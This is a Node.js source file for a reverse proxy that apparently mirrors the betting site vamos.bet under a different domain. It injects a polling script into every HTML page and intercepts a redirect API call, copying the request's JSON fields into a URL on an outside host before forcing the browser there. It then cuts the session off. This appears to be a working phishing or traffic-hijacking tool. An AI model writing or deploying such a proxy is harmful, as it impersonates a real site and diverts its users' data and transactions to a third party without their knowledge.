import http from "node:http";
import https from "node:https";

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;

// Domains
const PROXY_PUBLIC_DOMAIN = "dashsh.bet";
const TARGET_HOSTNAME = "vamos.bet";
const TARGET_PORT = 443;

// Endpoints
const REDIRECT_API_PATH = "/api/v9/test/redirect";
const REDIRECT_BASE_URL = "https://test3.marziplus.com";

/*
|--------------------------------------------------------------------------
| CONNECTION POOLING (Fixes 502 Socket Hangups under VPS load)
|--------------------------------------------------------------------------
*/

const agent = new https.Agent({
  keepAlive: true,
  keepAliveMsecs: 10_000,
  maxSockets: 100,
  maxFreeSockets: 10,
  timeout: 60_000
});

/*
|--------------------------------------------------------------------------
| REDIRECT WATCHER INJECTION
|--------------------------------------------------------------------------
*/

function injectWatcher(html) {
  const script = `
<script>
(function () {
  async function checkProxyRedirect() {
    try {
      const response = await fetch("/__proxy_redirect_status", {
        method: "GET",
        cache: "no-store",
        credentials: "same-origin"
      });

      if (!response.ok) return;

      const data = await response.json();
      if (data.redirect && data.url) {
        window.location.replace(data.url);
      }
    } catch (error) {}
  }

  setInterval(checkProxyRedirect, 500);
  checkProxyRedirect();
})();
</script>
`;

  return html.includes("</body>")
    ? html.replace("</body>", `${script}</body>`)
    : html + script;
}

/*
|--------------------------------------------------------------------------
| HEADER CLEANUP HELPERS
|--------------------------------------------------------------------------
*/

function removeHopByHopHeaders(headers) {
  const result = { ...headers };
  const connection = result.connection;

  if (connection) {
    const connectionHeaders = connection
      .split(",")
      .map(v => v.trim().toLowerCase());

    for (const header of connectionHeaders) {
      delete result[header];
    }
  }

  delete result.connection;
  delete result["keep-alive"];
  delete result["proxy-authenticate"];
  delete result["proxy-authorization"];
  delete result.te;
  delete result.trailer;
  delete result.upgrade;

  return result;
}

function buildUpstreamHeaders(clientReq) {
  const headers = {
    ...clientReq.headers,
    host: TARGET_HOSTNAME,
    "accept-encoding": "identity", // Raw text for script injection
    "user-agent": clientReq.headers["user-agent"] || "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  };

  delete headers.connection;
  delete headers["content-length"];
  delete headers["transfer-encoding"];

  return headers;
}

function mergeSetCookieHeaders(clientRes, upstreamHeaders) {
  const resHeaders = removeHopByHopHeaders(upstreamHeaders);
  
  // Merge proxy-set cookies with upstream cookies if both exist
  const existingCookie = clientRes.getHeader("Set-Cookie");
  if (existingCookie) {
    const upstreamCookies = resHeaders["set-cookie"] || [];
    const combined = Array.isArray(existingCookie) 
      ? existingCookie 
      : [existingCookie];

    if (Array.isArray(upstreamCookies)) {
      combined.push(...upstreamCookies);
    } else if (upstreamCookies) {
      combined.push(upstreamCookies);
    }
    resHeaders["set-cookie"] = combined;
  }
  
  return resHeaders;
}

/*
|--------------------------------------------------------------------------
| FORWARD REQUEST TO UPSTREAM
|--------------------------------------------------------------------------
*/

function forwardRequest(clientReq, clientRes, bufferedBody = null) {
  const headers = buildUpstreamHeaders(clientReq);

  const options = {
    hostname: TARGET_HOSTNAME,
    servername: TARGET_HOSTNAME, // Required SNI Header
    port: TARGET_PORT,
    method: clientReq.method,
    path: clientReq.url,
    headers,
    agent, // Persistent Socket Agent
    rejectUnauthorized: true
  };

  const upstreamReq = https.request(options, upstreamRes => {
    const contentType = upstreamRes.headers["content-type"] || "";

    // Handle HTML Injection
    if (contentType.toLowerCase().includes("text/html")) {
      const chunks = [];
      upstreamRes.on("data", chunk => chunks.push(chunk));
      upstreamRes.on("end", () => {
        let body = Buffer.concat(chunks);
        let html = body.toString("utf8");

        html = injectWatcher(html);
        body = Buffer.from(html, "utf8");

        const resHeaders = mergeSetCookieHeaders(clientRes, upstreamRes.headers);
        delete resHeaders["content-length"];
        delete resHeaders["content-encoding"];
        resHeaders["content-length"] = body.length;

        clientRes.writeHead(upstreamRes.statusCode || 200, resHeaders);
        clientRes.end(body);
      });
      return;
    }

    // Normal Assets & API Pass-through
    const resHeaders = mergeSetCookieHeaders(clientRes, upstreamRes.headers);
    clientRes.writeHead(upstreamRes.statusCode || 200, resHeaders);
    upstreamRes.pipe(clientRes);
  });

  upstreamReq.on("error", error => {
    console.error(`❌ Upstream Connection Error: [${error.code}] ${error.message}`);
    if (!clientRes.headersSent) {
      clientRes.writeHead(502, { "Content-Type": "text/plain; charset=utf-8" });
    }
    clientRes.end(`Bad Gateway: ${error.message}`);
  });

  if (Buffer.isBuffer(bufferedBody)) {
    upstreamReq.setHeader("Content-Length", bufferedBody.length);
    upstreamReq.end(bufferedBody);
    return;
  }

  clientReq.pipe(upstreamReq);
}

/*
|--------------------------------------------------------------------------
| COOKIE HELPER
|--------------------------------------------------------------------------
*/

function getCookie(req, name) {
  const cookieHeader = req.headers.cookie || "";
  const match = cookieHeader.match(new RegExp(`(?:^|;\\s*)${name}=([^;]+)`));
  return match ? decodeURIComponent(match[1]) : null;
}

/*
|--------------------------------------------------------------------------
| MAIN HTTP SERVER
|--------------------------------------------------------------------------
*/

const server = http.createServer(async (clientReq, clientRes) => {
  try {
    const parsedUrl = new URL(
      clientReq.url,
      `http://${clientReq.headers.host || PROXY_PUBLIC_DOMAIN}`
    );
    const path = parsedUrl.pathname;

    const userRedirectUrl = getCookie(clientReq, "proxy_redirect_url");
    const isRedirected = Boolean(userRedirectUrl);

    // 1. Reset state on home navigation (appends Secure flag for HTTPS)
    if (clientReq.method === "GET" && (path === "/" || path.startsWith("/home/"))) {
      clientRes.setHeader(
        "Set-Cookie",
        "proxy_redirect_url=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax"
      );
    }

    // 2. Redirect watcher poll endpoint
    if (clientReq.method === "GET" && path === "/__proxy_redirect_status") {
      const response = JSON.stringify({
        redirect: isRedirected,
        url: userRedirectUrl || null
      });

      clientRes.writeHead(200, {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "no-store, no-cache, must-revalidate",
        "Content-Length": Buffer.byteLength(response)
      });
      clientRes.end(response);
      return;
    }

    // 3. API Redirect trigger
    if (path === REDIRECT_API_PATH) {
      const chunks = [];
      for await (const chunk of clientReq) {
        chunks.push(chunk);
      }
      const body = Buffer.concat(chunks);

      if (body.length === 0) {
        forwardRequest(clientReq, clientRes, body);
        return;
      }

      let json;
      try {
        json = JSON.parse(body.toString("utf8"));
      } catch (err) {
        forwardRequest(clientReq, clientRes, body);
        return;
      }

      if (!json || typeof json !== "object" || Array.isArray(json)) {
        forwardRequest(clientReq, clientRes, body);
        return;
      }

      const redirectUrl = new URL(REDIRECT_BASE_URL);
      for (const [key, value] of Object.entries(json)) {
        if (value !== undefined && value !== null) {
          redirectUrl.searchParams.set(key, String(value));
        }
      }

      const finalUrl = redirectUrl.toString();

      // Store redirect target inside client-scoped cookie with Secure flag
      clientRes.setHeader(
        "Set-Cookie",
        `proxy_redirect_url=${encodeURIComponent(finalUrl)}; Path=/; Max-Age=30; HttpOnly; Secure; SameSite=Lax`
      );

      const response = JSON.stringify({ success: true, proxyRedirect: true });
      clientRes.writeHead(200, {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "no-store, no-cache, must-revalidate",
        "Content-Length": Buffer.byteLength(response)
      });
      clientRes.end(response);
      return;
    }

    // 4. Do not block static assets after redirect
    const isStaticAsset = /\.(js|css|png|jpg|jpeg|gif|ico|svg|woff2?|ttf|eot)$/i.test(path);

    if (isRedirected && !isStaticAsset && clientReq.method === "GET") {
      clientRes.writeHead(410, {
        "Content-Type": "text/plain; charset=utf-8",
        "Cache-Control": "no-store"
      });
      clientRes.end("Proxy session terminated");
      return;
    }

    // 5. Default Proxy
    forwardRequest(clientReq, clientRes);

  } catch (error) {
    console.error("❌ Critical server error:", error);
    if (!clientRes.headersSent) {
      clientRes.writeHead(500, { "Content-Type": "text/plain; charset=utf-8" });
    }
    clientRes.end("Internal Server Error");
  }
});

server.listen(PROXY_PORT, PROXY_HOST, () => {
  console.log(`Reverse Proxy listening on http://${PROXY_HOST}:${PROXY_PORT}`);
});